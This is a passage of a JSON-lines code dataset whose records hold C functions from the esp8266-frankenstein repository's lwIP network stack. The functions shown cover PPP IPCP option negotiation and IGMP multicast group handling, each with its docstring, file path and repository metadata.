options.\n     */\n    next = inp;\n    while (l) {\n\torc = CONFACK;\t\t\t/* Assume success */\n\tcip = p = next;\t\t\t/* Remember begining of CI */\n\tif (l < 2 ||\t\t\t/* Not enough data for CI header or */\n\t    p[1] < 2 ||\t\t\t/*  CI length too small or */\n\t    p[1] > l) {\t\t\t/*  CI length too big? */\n\t    IPCPDEBUG((\"ipcp_reqci: bad CI length!\"));\n\t    orc = CONFREJ;\t\t/* Reject bad CI */\n\t    cilen = l;\t\t\t/* Reject till end of packet */\n\t    l = 0;\t\t\t/* Don't loop again */\n\t    goto endswitch;\n\t}\n\tGETCHAR(citype, p);\t\t/* Parse CI type */\n\tGETCHAR(cilen, p);\t\t/* Parse CI length */\n\tl -= cilen;\t\t\t/* Adjust remaining length */\n\tnext += cilen;\t\t\t/* Step to next CI */\n\n\tswitch (citype) {\t\t/* Check CI type */\n\tcase CI_ADDRS:\n\t    if (!ao->old_addrs || ho->neg_addr ||\n\t\tcilen != CILEN_ADDRS) {\t/* Check CI length */\n\t\torc = CONFREJ;\t\t/* Reject CI */\n\t\tbreak;\n\t    }\n\n\t    /*\n\t     * If he has no address, or if we both have his address but\n\t     * disagree about it, then NAK it with our idea.\n\t     * In particular, if we don't know his address, but he does,\n\t     * then accept it.\n\t     */\n\t    GETLONG(tl, p);\t\t/* Parse source address (his) */\n\t    ciaddr1 = htonl(tl);\n\t    if (ciaddr1 != wo->hisaddr\n\t\t&& (ciaddr1 == 0 || !wo->accept_remote)) {\n\t\torc = CONFNAK;\n\t\tif (!reject_if_disagree) {\n\t\t    DECPTR(sizeof(u32_t), p);\n\t\t    tl = ntohl(wo->hisaddr);\n\t\t    PUTLONG(tl, p);\n\t\t}\n\t    } else if (ciaddr1 == 0 && wo->hisaddr == 0) {\n\t\t/*\n\t\t * If neither we nor he knows his address, reject the option.\n\t\t */\n\t\torc = CONFREJ;\n\t\two->req_addr = 0;\t/* don't NAK with 0.0.0.0 later */\n\t\tbreak;\n\t    }\n\n\t    /*\n\t     * If he doesn't know our address, or if we both have our address\n\t     * but disagree about it, then NAK it with our idea.\n\t     */\n\t    GETLONG(tl, p);\t\t/* Parse desination address (ours) */\n\t    ciaddr2 = htonl(tl);\n\t    if (ciaddr2 != wo->ouraddr) {\n\t\tif (ciaddr2 == 0 || !wo->accept_local) {\n\t\t    orc = CONFNAK;\n\t\t    if (!reject_if_disagree) {\n\t\t\tDECPTR(sizeof(u32_t), p);\n\t\t\ttl = ntohl(wo->ouraddr);\n\t\t\tPUTLONG(tl, p);\n\t\t    }\n\t\t} else {\n\t\t    wo->ouraddr = ciaddr2;\t/* accept peer's idea */\n\t\t}\n\t    }\n\n\t    ho->old_addrs = 1;\n\t    ho->hisaddr = ciaddr1;\n\t    ho->ouraddr = ciaddr2;\n\t    break;\n\n\tcase CI_ADDR:\n\t    if (!ao->neg_addr || ho->old_addrs ||\n\t\tcilen != CILEN_ADDR) {\t/* Check CI length */\n\t\torc = CONFREJ;\t\t/* Reject CI */\n\t\tbreak;\n\t    }\n\n\t    /*\n\t     * If he has no address, or if we both have his address but\n\t     * disagree about it, then NAK it with our idea.\n\t     * In particular, if we don't know his address, but he does,\n\t     * then accept it.\n\t     */\n\t    GETLONG(tl, p);\t/* Parse source address (his) */\n\t    ciaddr1 = htonl(tl);\n\t    if (ciaddr1 != wo->hisaddr\n\t\t&& (ciaddr1 == 0 || !wo->accept_remote)) {\n\t\torc = CONFNAK;\n\t\tif (!reject_if_disagree) {\n\t\t    DECPTR(sizeof(u32_t), p);\n\t\t    tl = ntohl(wo->hisaddr);\n\t\t    PUTLONG(tl, p);\n\t\t}\n\t    } else if (ciaddr1 == 0 && wo->hisaddr == 0) {\n\t\t/*\n\t\t * Don't ACK an address of 0.0.0.0 - reject it instead.\n\t\t */\n\t\torc = CONFREJ;\n\t\two->req_addr = 0;\t/* don't NAK with 0.0.0.0 later */\n\t\tbreak;\n\t    }\n\t\n\t    ho->neg_addr = 1;\n\t    ho->hisaddr = ciaddr1;\n\t    break;\n\n#if LWIP_DNS\n\tcase CI_MS_DNS1:\n\tcase CI_MS_DNS2:\n\t    /* Microsoft primary or secondary DNS request */\n\t    d = citype == CI_MS_DNS2;\n\n\t    /* If we do not have a DNS address then we cannot send it */\n\t    if (ao->dnsaddr[d] == 0 ||\n\t\tcilen != CILEN_ADDR) {\t/* Check CI length */\n\t\torc = CONFREJ;\t\t/* Reject CI */\n\t\tbreak;\n\t    }\n\t    GETLONG(tl, p);\n\t    if (htonl(tl) != ao->dnsaddr[d]) {\n                DECPTR(sizeof(u32_t), p);\n\t\ttl = ntohl(ao->dnsaddr[d]);\n\t\tPUTLONG(tl, p);\n\t\torc = CONFNAK;\n            }\n            break;\n#endif /* LWIP_DNS */\n\n#if 0 /* UNUSED - WINS */\n\tcase CI_MS_WINS1:\n\tcase CI_MS_WINS2:\n\t    /* Microsoft primary or secondary WINS request */\n\t    d = citype == CI_MS_WINS2;\n\n\t    /* If we do not have a DNS address then we cannot send it */\n\t    if (ao->winsaddr[d] == 0 ||\n\t\tcilen != CILEN_ADDR) {\t/* Check CI length */\n\t\torc = CONFREJ;\t\t/* Reject CI */\n\t\tbreak;\n\t    }\n\t    GETLONG(tl, p);\n\t    if (htonl(tl) != ao->winsaddr[d]) {\n                DECPTR(sizeof(u32_t), p);\n\t\ttl = ntohl(ao->winsaddr[d]);\n\t\tPUTLONG(tl, p);\n\t\torc = CONFNAK;\n            }\n            break;\n#endif /* UNUSED - WINS */\n\n#if VJ_SUPPORT\n\tcase CI_COMPRESSTYPE:\n\t    if (!ao->neg_vj ||\n\t\t(cilen != CILEN_VJ && cilen != CILEN_COMPRESS)) {\n\t\torc = CONFREJ;\n\t\tbreak;\n\t    }\n\t    GETSHORT(cishort, p);\n\n\t    if (!(cishort == IPCP_VJ_COMP ||\n\t\t  (cishort == IPCP_VJ_COMP_OLD && cilen == CILEN_COMPRESS))) {\n\t\torc = CONFREJ;\n\t\tbreak;\n\t    }\n\n\t    ho->neg_vj = 1;\n\t    ho->vj_protocol = cishort;\n\t    if (cilen == CILEN_VJ) {\n\t\tGETCHAR(maxslotindex, p);\n\t\tif (maxslotindex > ao->maxslotindex) { \n\t\t    orc = CONFNAK;\n\t\t    if (!reject_if_disagree){\n\t\t\tDECPTR(1, p);\n\t\t\tPUTCHAR(ao->maxslotindex, p);\n\t\t    }\n\t\t}\n\t\tGETCHAR(cflag, p);\n\t\tif (cflag && !ao->cflag) {\n\t\t    orc = CONFNAK;\n\t\t    if (!reject_if_disagree){\n\t\t\tDECPTR(1, p);\n\t\t\tPUTCHAR(wo->cflag, p);\n\t\t    }\n\t\t}\n\t\tho->maxslotindex = maxslotindex;\n\t\tho->cflag = cflag;\n\t    } else {\n\t\tho->old_vj = 1;\n\t\tho->maxslotindex = MAX_STATES - 1;\n\t\tho->cflag = 1;\n\t    }\n\t    break;\n#endif /* VJ_SUPPORT */\n\n\tdefault:\n\t    orc = CONFREJ;\n\t    break;\n\t}\nendswitch:\n\tif (orc == CONFACK &&\t\t/* Good CI */\n\t    rc != CONFACK)\t\t/*  but prior CI wasnt? */\n\t    continue;\t\t\t/* Don't send this one */\n\n\tif (orc == CONFNAK) {\t\t/* Nak this CI? */\n\t    if (reject_if_disagree)\t/* Getting fed up with sending NAKs? */\n\t\torc = CONFREJ;\t\t/* Get tough if so */\n\t    else {\n\t\tif (rc == CONFREJ)\t/* Rejecting prior CI? */\n\t\t    continue;\t\t/* Don't send this one */\n\t\tif (rc == CONFACK) {\t/* Ack'd all prior CIs? */\n\t\t    rc = CONFNAK;\t/* Not anymore... */\n\t\t    ucp = inp;\t\t/* Backup */\n\t\t}\n\t    }\n\t}\n\n\tif (orc == CONFREJ &&\t\t/* Reject this CI */\n\t    rc != CONFREJ) {\t\t/*  but no prior ones? */\n\t    rc = CONFREJ;\n\t    ucp = inp;\t\t\t/* Backup */\n\t}\n\n\t/* Need to move CI? */\n\tif (ucp != cip)\n\t    MEMCPY(ucp, cip, cilen);\t/* Move it */\n\n\t/* Update output pointer */\n\tINCPTR(cilen, ucp);\n    }\n\n    /*\n     * If we aren't rejecting this packet, and we want to negotiate\n     * their address, and they didn't send their address, then we\n     * send a NAK with a CI_ADDR option appended.  We assume the\n     * input buffer is long enough that we can append the extra\n     * option safely.\n     */\n    if (rc != CONFREJ && !ho->neg_addr && !ho->old_addrs &&\n\two->req_addr && !reject_if_disagree && !pcb->settings.noremoteip) {\n\tif (rc == CONFACK) {\n\t    rc = CONFNAK;\n\t    ucp = inp;\t\t\t/* reset pointer */\n\t    wo->req_addr = 0;\t\t/* don't ask again */\n\t}\n\tPUTCHAR(CI_ADDR, ucp);\n\tPUTCHAR(CILEN_ADDR, ucp);\n\ttl = ntohl(wo->hisaddr);\n\tPUTLONG(tl, ucp);\n    }\n\n    *len = ucp - inp;\t\t\t/* Compute output length */\n    IPCPDEBUG((\"ipcp: returning Configure-%s\", CODENAME(rc)));\n    return (rc);\t\t\t/* Return final code */\n}", "path": "src\\lwip-git\\netif\\ppp\\ipcp.c", "repo_name": "nekromant/esp8266-frankenstein", "stars": 315, "license": "None", "language": "c", "size": 3556}
{"docstring": "/**\n * Initialize the IGMP module\n */\n", "func_signal": "void\nigmp_init(void)", "code": "{\n  LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_init: initializing\\n\"));\n\n  IP4_ADDR(&allsystems, 224, 0, 0, 1);\n  IP4_ADDR(&allrouters, 224, 0, 0, 2);\n}", "path": "src\\lwip-esp\\core\\ipv4\\igmp.c", "repo_name": "nekromant/esp8266-frankenstein", "stars": 315, "license": "None", "language": "c", "size": 3556}
{"docstring": "/**\n * Join a group on one network interface.\n *\n * @param ifaddr ip address of the network interface which should join a new group\n * @param groupaddr the ip address of the group which to join\n * @return ERR_OK if group was joined on the netif(s), an err_t otherwise\n */\n", "func_signal": "err_t\nigmp_joingroup(ip_addr_t *ifaddr, ip_addr_t *groupaddr)", "code": "{\n  err_t              err = ERR_VAL; /* no matching interface */\n  struct igmp_group *group;\n  struct netif      *netif;\n\n  /* make sure it is multicast address */\n  LWIP_ERROR(\"igmp_joingroup: attempt to join non-multicast address\", ip_addr_ismulticast(groupaddr), return ERR_VAL;);\n  LWIP_ERROR(\"igmp_joingroup: attempt to join allsystems address\", (!ip_addr_cmp(groupaddr, &allsystems)), return ERR_VAL;);\n\n  /* loop through netif's */\n  netif = netif_list;\n  while (netif != NULL) {\n    /* Should we join this interface ? */\n    if ((netif->flags & NETIF_FLAG_IGMP) && ((ip_addr_isany(ifaddr) || ip_addr_cmp(&(netif->ip_addr), ifaddr)))) {\n      /* find group or create a new one if not found */\n      group = igmp_lookup_group(netif, groupaddr);\n\n      if (group != NULL) {\n        /* This should create a new group, check the state to make sure */\n        if (group->group_state != IGMP_GROUP_NON_MEMBER) {\n          LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_joingroup: join to group not in state IGMP_GROUP_NON_MEMBER\\n\"));\n        } else {\n          /* OK - it was new group */\n          LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_joingroup: join to new group: \"));\n          ip_addr_debug_print(IGMP_DEBUG, groupaddr);\n          LWIP_DEBUGF(IGMP_DEBUG, (\"\\n\"));\n\n          /* If first use of the group, allow the group at the MAC level */\n          if ((group->use==0) && (netif->igmp_mac_filter != NULL)) {\n            LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_joingroup: igmp_mac_filter(ADD \"));\n            ip_addr_debug_print(IGMP_DEBUG, groupaddr);\n            LWIP_DEBUGF(IGMP_DEBUG, (\") on if %p\\n\", netif));\n            netif->igmp_mac_filter(netif, groupaddr, IGMP_ADD_MAC_FILTER);\n          }\n\n          IGMP_STATS_INC(igmp.tx_join);\n          igmp_send(group, IGMP_V2_MEMB_REPORT);\n\n          igmp_start_timer(group, IGMP_JOIN_DELAYING_MEMBER_TMR);\n\n          /* Need to work out where this timer comes from */\n          group->group_state = IGMP_GROUP_DELAYING_MEMBER;\n        }\n        /* Increment group use */\n        group->use++;\n        /* Join on this interface */\n        err = ERR_OK;\n      } else {\n        /* Return an error even if some network interfaces are joined */\n        /** @todo undo any other netif already joined */\n        LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_joingroup: Not enought memory to join to group\\n\"));\n        return ERR_MEM;\n      }\n    }\n    /* proceed to next network interface */\n    netif = netif->next;\n  }\n\n  return err;\n}", "path": "src\\lwip-esp\\core\\ipv4\\igmp.c", "repo_name": "nekromant/esp8266-frankenstein", "stars": 315, "license": "None", "language": "c", "size": 3556}
{"docstring": "/* UNUSED */\n/*\n * ip_check_options - check that any IP-related options are OK,\n * and assign appropriate defaults.\n */\n", "func_signal": "static void\nip_check_options()", "code": "{\n    struct hostent *hp;\n    u32_t local;\n    ipcp_options *wo = &ipcp_wantoptions[0];\n\n    /*\n     * Default our local IP address based on our hostname.\n     * If local IP address already given, don't bother.\n     */\n    if (wo->ouraddr == 0 && !disable_defaultip) {\n\t/*\n\t * Look up our hostname (possibly with domain name appended)\n\t * and take the first IP address as our local IP address.\n\t * If there isn't an IP address for our hostname, too bad.\n\t */\n\two->accept_local = 1;\t/* don't insist on this default value */\n\tif ((hp = gethostbyname(hostname)) != NULL) {\n\t    local = *(u32_t *)hp->h_addr;\n\t    if (local != 0 && !bad_ip_adrs(local))\n\t\two->ouraddr = local;\n\t}\n    }\n    ask_for_local = wo->ouraddr != 0 || !disable_defaultip;\n}", "path": "src\\lwip-git\\netif\\ppp\\ipcp.c", "repo_name": "nekromant/esp8266-frankenstein", "stars": 315, "license": "None", "language": "c", "size": 3556}
{"docstring": "/**\n * Leave a group on one network interface.\n *\n * @param ifaddr ip address of the network interface which should leave a group\n * @param groupaddr the ip address of the group which to leave\n * @return ERR_OK if group was left on the netif(s), an err_t otherwise\n */\n", "func_signal": "err_t\nigmp_leavegroup(ip_addr_t *ifaddr, ip_addr_t *groupaddr)", "code": "{\n  err_t              err = ERR_VAL; /* no matching interface */\n  struct igmp_group *group;\n  struct netif      *netif;\n\n  /* make sure it is multicast address */\n  LWIP_ERROR(\"igmp_leavegroup: attempt to leave non-multicast address\", ip_addr_ismulticast(groupaddr), return ERR_VAL;);\n  LWIP_ERROR(\"igmp_leavegroup: attempt to leave allsystems address\", (!ip_addr_cmp(groupaddr, &allsystems)), return ERR_VAL;);\n\n  /* loop through netif's */\n  netif = netif_list;\n  while (netif != NULL) {\n    /* Should we leave this interface ? */\n    if ((netif->flags & NETIF_FLAG_IGMP) && ((ip_addr_isany(ifaddr) || ip_addr_cmp(&(netif->ip_addr), ifaddr)))) {\n      /* find group */\n      group = igmp_lookfor_group(netif, groupaddr);\n\n      if (group != NULL) {\n        /* Only send a leave if the flag is set according to the state diagram */\n        LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_leavegroup: Leaving group: \"));\n        ip_addr_debug_print(IGMP_DEBUG, groupaddr);\n        LWIP_DEBUGF(IGMP_DEBUG, (\"\\n\"));\n\n        /* If there is no other use of the group */\n        if (group->use <= 1) {\n          /* If we are the last reporter for this group */\n          if (group->last_reporter_flag) {\n            LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_leavegroup: sending leaving group\\n\"));\n            IGMP_STATS_INC(igmp.tx_leave);\n            igmp_send(group, IGMP_LEAVE_GROUP);\n          }\n          \n          /* Disable the group at the MAC level */\n          if (netif->igmp_mac_filter != NULL) {\n            LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_leavegroup: igmp_mac_filter(DEL \"));\n            ip_addr_debug_print(IGMP_DEBUG, groupaddr);\n            LWIP_DEBUGF(IGMP_DEBUG, (\") on if %p\\n\", netif));\n            netif->igmp_mac_filter(netif, groupaddr, IGMP_DEL_MAC_FILTER);\n          }\n          \n          LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_leavegroup: remove group: \"));\n          ip_addr_debug_print(IGMP_DEBUG, groupaddr);\n          LWIP_DEBUGF(IGMP_DEBUG, (\"\\n\"));          \n          \n          /* Free the group */\n          igmp_remove_group(group);\n        } else {\n          /* Decrement group use */\n          group->use--;\n        }\n        /* Leave on this interface */\n        err = ERR_OK;\n      } else {\n        /* It's not a fatal error on \"leavegroup\" */\n        LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_leavegroup: not member of group\\n\"));\n      }\n    }\n    /* proceed to next network interface */\n    netif = netif->next;\n  }\n\n  return err;\n}", "path": "src\\lwip-esp\\core\\ipv4\\igmp.c", "repo_name": "nekromant/esp8266-frankenstein", "stars": 315, "license": "None", "language": "c", "size": 3556}
{"docstring": "/*\n * ipcp_down - IPCP has gone DOWN.\n *\n * Take the IP network interface down, clear its addresses\n * and delete routes through it.\n */\n", "func_signal": "static void ipcp_down(fsm *f)", "code": "{\n    ppp_pcb *pcb = f->pcb;\n    ipcp_options *ho = &pcb->ipcp_hisoptions;\n    ipcp_options *go = &pcb->ipcp_gotoptions;\n\n    IPCPDEBUG((\"ipcp: down\"));\n#if PPP_STATS_SUPPORT\n    /* XXX a bit IPv4-centric here, we only need to get the stats\n     * before the interface is marked down. */\n    /* XXX more correct: we must get the stats before running the notifiers,\n     * at least for the radius plugin */\n    update_link_stats(f->unit);\n#endif /* PPP_STATS_SUPPORT */\n#if PPP_NOTIFY\n    notify(ip_down_notifier, 0);\n#endif /* PPP_NOTIFY */\n#if 0 /* UNUSED */\n    if (ip_down_hook)\n\tip_down_hook();\n#endif /* UNUSED */\n    if (pcb->ipcp_is_up) {\n\tpcb->ipcp_is_up = 0;\n\tnp_down(pcb, PPP_IP);\n    }\n#if VJ_SUPPORT\n    sifvjcomp(pcb, 0, 0, 0);\n#endif /* VJ_SUPPORT */\n\n#if PPP_STATS_SUPPORT\n    print_link_stats(); /* _after_ running the notifiers and ip_down_hook(),\n\t\t\t * because print_link_stats() sets link_stats_valid\n\t\t\t * to 0 (zero) */\n#endif /* PPP_STATS_SUPPORT */\n\n#if DEMAND_SUPPORT\n    /*\n     * If we are doing dial-on-demand, set the interface\n     * to queue up outgoing packets (for now).\n     */\n    if (demand) {\n\tsifnpmode(pcb, PPP_IP, NPMODE_QUEUE);\n    } else\n#endif /* DEMAND_SUPPORT */\n    {\n\tsifnpmode(pcb, PPP_IP, NPMODE_DROP);\n\tsifdown(pcb);\n\tipcp_clear_addrs(pcb, go->ouraddr,\n\t\t\t ho->hisaddr, 0);\n#if LWIP_DNS\n\tcdns(pcb, go->dnsaddr[0], go->dnsaddr[1]);\n#endif /* LWIP_DNS */\n    }\n}", "path": "src\\lwip-git\\netif\\ppp\\ipcp.c", "repo_name": "nekromant/esp8266-frankenstein", "stars": 315, "license": "None", "language": "c", "size": 3556}
{"docstring": "/**\n * The igmp timer function (both for NO_SYS=1 and =0)\n * Should be called every IGMP_TMR_INTERVAL milliseconds (100 ms is default).\n */\n", "func_signal": "void\nigmp_tmr(void)", "code": "{\n  struct igmp_group *group = igmp_group_list;\n\n  while (group != NULL) {\n    if (group->timer > 0) {\n      group->timer--;\n      if (group->timer == 0) {\n        igmp_timeout(group);\n      }\n    }\n    group = group->next;\n  }\n}", "path": "src\\lwip-esp\\core\\ipv4\\igmp.c", "repo_name": "nekromant/esp8266-frankenstein", "stars": 315, "license": "None", "language": "c", "size": 3556}
{"docstring": "/**\n * Called if a timeout for one group is reached.\n * Sends a report for this group.\n *\n * @param group an igmp_group for which a timeout is reached\n */\n", "func_signal": "static void\nigmp_timeout(struct igmp_group *group)", "code": "{\n  /* If the state is IGMP_GROUP_DELAYING_MEMBER then we send a report for this group */\n  if (group->group_state == IGMP_GROUP_DELAYING_MEMBER) {\n    LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_timeout: report membership for group with address \"));\n    ip_addr_debug_print(IGMP_DEBUG, &(group->group_address));\n    LWIP_DEBUGF(IGMP_DEBUG, (\" on if %p\\n\", group->netif));\n\n    IGMP_STATS_INC(igmp.tx_report);\n    igmp_send(group, IGMP_V2_MEMB_REPORT);\n  }\n}", "path": "src\\lwip-esp\\core\\ipv4\\igmp.c", "repo_name": "nekromant/esp8266-frankenstein", "stars": 315, "license": "None", "language": "c", "size": 3556}
{"docstring": "/*\n * ipcp_rejci - Reject some of our CIs.\n * Callback from fsm_rconfnakrej.\n */\n", "func_signal": "static int ipcp_rejci(fsm *f, u_char *p, int len)", "code": "{\n    ppp_pcb *pcb = f->pcb;\n    ipcp_options *go = &pcb->ipcp_gotoptions;\n    u_char cilen;\n#if VJ_SUPPORT\n    u_char cimaxslotindex, ciflag;\n    u_short cishort;\n#endif /* VJ_SUPPORT */\n    u32_t cilong;\n    ipcp_options try_;\t\t/* options to request next time */\n\n    try_ = *go;\n    /*\n     * Any Rejected CIs must be in exactly the same order that we sent.\n     * Check packet length and CI length at each step.\n     * If we find any deviations, then this packet is bad.\n     */\n#define REJCIADDRS(opt, neg, val1, val2) \\\n    if ((neg) && \\\n\t(cilen = p[1]) == CILEN_ADDRS && \\\n\tlen >= cilen && \\\n\tp[0] == opt) { \\\n\tu32_t l; \\\n\tlen -= cilen; \\\n\tINCPTR(2, p); \\\n\tGETLONG(l, p); \\\n\tcilong = htonl(l); \\\n\t/* Check rejected value. */ \\\n\tif (cilong != val1) \\\n\t    goto bad; \\\n\tGETLONG(l, p); \\\n\tcilong = htonl(l); \\\n\t/* Check rejected value. */ \\\n\tif (cilong != val2) \\\n\t    goto bad; \\\n\ttry_.old_addrs = 0; \\\n    }\n\n#if VJ_SUPPORT\n#define REJCIVJ(opt, neg, val, old, maxslot, cflag) \\\n    if (go->neg && \\\n\tp[1] == (old? CILEN_COMPRESS : CILEN_VJ) && \\\n\tlen >= p[1] && \\\n\tp[0] == opt) { \\\n\tlen -= p[1]; \\\n\tINCPTR(2, p); \\\n\tGETSHORT(cishort, p); \\\n\t/* Check rejected value. */  \\\n\tif (cishort != val) \\\n\t    goto bad; \\\n\tif (!old) { \\\n\t   GETCHAR(cimaxslotindex, p); \\\n\t   if (cimaxslotindex != maxslot) \\\n\t     goto bad; \\\n\t   GETCHAR(ciflag, p); \\\n\t   if (ciflag != cflag) \\\n\t     goto bad; \\\n        } \\\n\ttry_.neg = 0; \\\n     }\n#endif /* VJ_SUPPORT */\n\n#define REJCIADDR(opt, neg, val) \\\n    if (go->neg && \\\n\t(cilen = p[1]) == CILEN_ADDR && \\\n\tlen >= cilen && \\\n\tp[0] == opt) { \\\n\tu32_t l; \\\n\tlen -= cilen; \\\n\tINCPTR(2, p); \\\n\tGETLONG(l, p); \\\n\tcilong = htonl(l); \\\n\t/* Check rejected value. */ \\\n\tif (cilong != val) \\\n\t    goto bad; \\\n\ttry_.neg = 0; \\\n    }\n\n#if LWIP_DNS\n#define REJCIDNS(opt, neg, dnsaddr) \\\n    if (go->neg && \\\n\t((cilen = p[1]) == CILEN_ADDR) && \\\n\tlen >= cilen && \\\n\tp[0] == opt) { \\\n\tu32_t l; \\\n\tlen -= cilen; \\\n\tINCPTR(2, p); \\\n\tGETLONG(l, p); \\\n\tcilong = htonl(l); \\\n\t/* Check rejected value. */ \\\n\tif (cilong != dnsaddr) \\\n\t    goto bad; \\\n\ttry_.neg = 0; \\\n    }\n#endif /* LWIP_DNS */\n\n#if 0 /* UNUSED - WINS */\n#define REJCIWINS(opt, addr) \\\n    if (addr && \\\n\t((cilen = p[1]) == CILEN_ADDR) && \\\n\tlen >= cilen && \\\n\tp[0] == opt) { \\\n\tu32_t l; \\\n\tlen -= cilen; \\\n\tINCPTR(2, p); \\\n\tGETLONG(l, p); \\\n\tcilong = htonl(l); \\\n\t/* Check rejected value. */ \\\n\tif (cilong != addr) \\\n\t    goto bad; \\\n\ttry_.winsaddr[opt == CI_MS_WINS2] = 0; \\\n    }\n#endif /* UNUSED - WINS */\n\n    REJCIADDRS(CI_ADDRS, !go->neg_addr && go->old_addrs,\n\t       go->ouraddr, go->hisaddr);\n\n#if VJ_SUPPORT\n    REJCIVJ(CI_COMPRESSTYPE, neg_vj, go->vj_protocol, go->old_vj,\n\t    go->maxslotindex, go->cflag);\n#endif /* VJ_SUPPORT */\n\n    REJCIADDR(CI_ADDR, neg_addr, go->ouraddr);\n\n#if LWIP_DNS\n    REJCIDNS(CI_MS_DNS1, req_dns1, go->dnsaddr[0]);\n\n    REJCIDNS(CI_MS_DNS2, req_dns2, go->dnsaddr[1]);\n#endif /* LWIP_DNS */\n\n#if 0 /* UNUSED - WINS */\n    REJCIWINS(CI_MS_WINS1, go->winsaddr[0]);\n\n    REJCIWINS(CI_MS_WINS2, go->winsaddr[1]);\n#endif /* UNUSED - WINS */\n\n    /*\n     * If there are any remaining CIs, then this packet is bad.\n     */\n    if (len != 0)\n\tgoto bad;\n    /*\n     * Now we can update state.\n     */\n    if (f->state != PPP_FSM_OPENED)\n\t*go = try_;\n    return 1;\n\nbad:\n    IPCPDEBUG((\"ipcp_rejci: received bad Reject!\"));\n    return 0;\n}", "path": "src\\lwip-git\\netif\\ppp\\ipcp.c", "repo_name": "nekromant/esp8266-frankenstein", "stars": 315, "license": "None", "language": "c", "size": 3556}
{"docstring": "/**\n * Search for a specific igmp group and create a new one if not found-\n *\n * @param ifp the network interface for which to look\n * @param addr the group ip address to search\n * @return a struct igmp_group*,\n *         NULL on memory error.\n */\n", "func_signal": "struct igmp_group *\nigmp_lookup_group(struct netif *ifp, ip_addr_t *addr)", "code": "{\n  struct igmp_group *group = igmp_group_list;\n  \n  /* Search if the group already exists */\n  group = igmp_lookfor_group(ifp, addr);\n  if (group != NULL) {\n    /* Group already exists. */\n    return group;\n  }\n\n  /* Group doesn't exist yet, create a new one */\n  group = (struct igmp_group *)memp_malloc(MEMP_IGMP_GROUP);\n  if (group != NULL) {\n    group->netif              = ifp;\n    ip_addr_set(&(group->group_address), addr);\n    group->timer              = 0; /* Not running */\n    group->group_state        = IGMP_GROUP_NON_MEMBER;\n    group->last_reporter_flag = 0;\n    group->use                = 0;\n    group->next               = igmp_group_list;\n    \n    igmp_group_list = group;\n  }\n\n  LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_lookup_group: %sallocated a new group with address \", (group?\"\":\"impossible to \")));\n  ip_addr_debug_print(IGMP_DEBUG, addr);\n  LWIP_DEBUGF(IGMP_DEBUG, (\" on if %p\\n\", ifp));\n\n  return group;\n}", "path": "src\\lwip-esp\\core\\ipv4\\igmp.c", "repo_name": "nekromant/esp8266-frankenstein", "stars": 315, "license": "None", "language": "c", "size": 3556}
{"docstring": "/*\n * ipcp_nakci - Peer has sent a NAK for some of our CIs.\n * This should not modify any state if the Nak is bad\n * or if IPCP is in the OPENED state.\n * Calback from fsm_rconfnakrej - Receive Configure-Nak or Configure-Reject.\n *\n * Returns:\n *\t0 - Nak was bad.\n *\t1 - Nak was good.\n */\n", "func_signal": "static int ipcp_nakci(fsm *f, u_char *p, int len, int treat_as_reject)", "code": "{\n    ppp_pcb *pcb = f->pcb;\n    ipcp_options *go = &pcb->ipcp_gotoptions;\n    u_char citype, cilen, *next;\n#if VJ_SUPPORT\n    u_char cimaxslotindex, cicflag;\n    u_short cishort;\n#endif /* VJ_SUPPORT */\n    u32_t ciaddr1, ciaddr2, l;\n#if LWIP_DNS\n    u32_t cidnsaddr;\n#endif /* LWIP_DNS */\n    ipcp_options no;\t\t/* options we've seen Naks for */\n    ipcp_options try_;\t\t/* options to request next time */\n\n    BZERO(&no, sizeof(no));\n    try_ = *go;\n\n    /*\n     * Any Nak'd CIs must be in exactly the same order that we sent.\n     * Check packet length and CI length at each step.\n     * If we find any deviations, then this packet is bad.\n     */\n#define NAKCIADDRS(opt, neg, code) \\\n    if ((neg) && \\\n\t(cilen = p[1]) == CILEN_ADDRS && \\\n\tlen >= cilen && \\\n\tp[0] == opt) { \\\n\tlen -= cilen; \\\n\tINCPTR(2, p); \\\n\tGETLONG(l, p); \\\n\tciaddr1 = htonl(l); \\\n\tGETLONG(l, p); \\\n\tciaddr2 = htonl(l); \\\n\tno.old_addrs = 1; \\\n\tcode \\\n    }\n\n#if VJ_SUPPORT\n#define NAKCIVJ(opt, neg, code) \\\n    if (go->neg && \\\n\t((cilen = p[1]) == CILEN_COMPRESS || cilen == CILEN_VJ) && \\\n\tlen >= cilen && \\\n\tp[0] == opt) { \\\n\tlen -= cilen; \\\n\tINCPTR(2, p); \\\n\tGETSHORT(cishort, p); \\\n\tno.neg = 1; \\\n        code \\\n    }\n#endif /* VJ_SUPPORT */\n\n#define NAKCIADDR(opt, neg, code) \\\n    if (go->neg && \\\n\t(cilen = p[1]) == CILEN_ADDR && \\\n\tlen >= cilen && \\\n\tp[0] == opt) { \\\n\tlen -= cilen; \\\n\tINCPTR(2, p); \\\n\tGETLONG(l, p); \\\n\tciaddr1 = htonl(l); \\\n\tno.neg = 1; \\\n\tcode \\\n    }\n\n#if LWIP_DNS\n#define NAKCIDNS(opt, neg, code) \\\n    if (go->neg && \\\n\t((cilen = p[1]) == CILEN_ADDR) && \\\n\tlen >= cilen && \\\n\tp[0] == opt) { \\\n\tlen -= cilen; \\\n\tINCPTR(2, p); \\\n\tGETLONG(l, p); \\\n\tcidnsaddr = htonl(l); \\\n\tno.neg = 1; \\\n\tcode \\\n    }\n#endif /* LWIP_DNS */\n\n    /*\n     * Accept the peer's idea of {our,his} address, if different\n     * from our idea, only if the accept_{local,remote} flag is set.\n     */\n    NAKCIADDRS(CI_ADDRS, !go->neg_addr && go->old_addrs,\n\t       if (treat_as_reject) {\n\t\t   try_.old_addrs = 0;\n\t       } else {\n\t\t   if (go->accept_local && ciaddr1) {\n\t\t       /* take his idea of our address */\n\t\t       try_.ouraddr = ciaddr1;\n\t\t   }\n\t\t   if (go->accept_remote && ciaddr2) {\n\t\t       /* take his idea of his address */\n\t\t       try_.hisaddr = ciaddr2;\n\t\t   }\n\t       }\n\t);\n\n#if 